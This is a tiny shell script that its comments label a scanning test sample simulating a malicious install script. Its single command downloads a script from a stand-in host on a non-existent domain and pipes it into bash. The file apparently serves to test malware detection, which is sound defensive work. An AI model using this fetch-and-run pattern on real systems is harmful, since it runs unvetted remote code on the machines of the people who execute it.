#!/bin/sh
# DO NOT RUN — scanning test sample. Simulated malicious install script.
# The domain is example.invalid (guaranteed non-existent).
curl -s https://evil.example.invalid/setup.sh | bash
